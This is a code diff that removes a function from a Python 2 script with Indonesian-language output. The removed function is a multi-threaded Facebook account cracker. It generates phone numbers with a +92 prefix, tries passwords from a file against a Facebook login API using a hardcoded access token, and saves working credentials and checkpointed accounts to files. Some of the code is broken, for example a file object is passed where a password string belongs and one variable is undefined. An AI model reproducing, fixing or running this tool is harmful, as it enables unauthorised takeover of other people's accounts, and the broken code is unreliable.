@@ -97,67 +97,6 @@ def lisensi():
 def nopes():
 	os.system('clear')
 	print logo
-	print("300 304 311 325 336 345 540 547")
-	print 42*"\033[1;96m="
-	try:
-		c = raw_input("\033[1;96m[?] \033[1;93mMasukan Kode  \033[1;97m: ")
-		k="+92"
-		idlist = ('.txt')
-		for line in open(idlist,"r").readlines():
-			id.append(line.strip())
-	except IOError:
-		print ("[!] File Not Found")
-		raw_input("\n[ Back ]")
-		keluar()
-
-
-	xxx = str(len(id))
-	print ('\033[1;96m[✓] \033[1;93mTotal Nomor: \033[97m'+xxx)
-	time.sleep(0.1)
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
-	print 42*"\033[1;96m="
-	print "\033[96m| 😎 | " + 3*" " + "\033[35mNOMOR HP" + 4*" " + "\033[96m|" + 5*" " + "\033[33mPassword" + 8*" " + "\033[96m"
-	print 42*"\033[1;96m="
-
-
-	def main(arg):
-		global cpb,oks
-		user = arg
-		try:
-			os.mkdir('save')
-		except OSError:
-			pass
-		try:
-			pass1 = open('pass.txt', 'r')
-			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-			q = json.load(data)
-			if 'access_token' in q:
-				print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass1 +  ' | '  +  code
-				okb = open('save/successfull.txt', 'a')
-				okb.write(k+c+user+'|'+pass1+'\n')
-				okb.close()
-				oks.append(c+user+pass1)
-			else:
-				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + k + c + user +   ' | '  +  pass1 +  ' | '  +  code
-					cps = open('save/checkpoint.txt', 'a')
-					cps.write(k+c+user+'|'+pass1+'\n')
-					cps.close()
-					cpb.append(c+user+pass1)
-
-
-		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print 42*"\033[1;96m="
-	print '\033[1;96m[✓] \033[1;93mProcess Telah Selesai ...'
-	print '\033[1;96m[✓] \033[1;34mTotal OK : \033[1;97m'+str(len(oks))
-	print '\033[1;96m[✓] \033[1;93mTotal CP  : \033[1;97m'+str(len(cpb))
-	print('\033[1;96m[✓] \033[1;91mCP File Telah Disimpan : save/cp.txt')
-	raw_input('\033[1;96m[\033[1;97mKembali\033[1;96m]')
-	login()
 
 
 if __name__=='__main__':
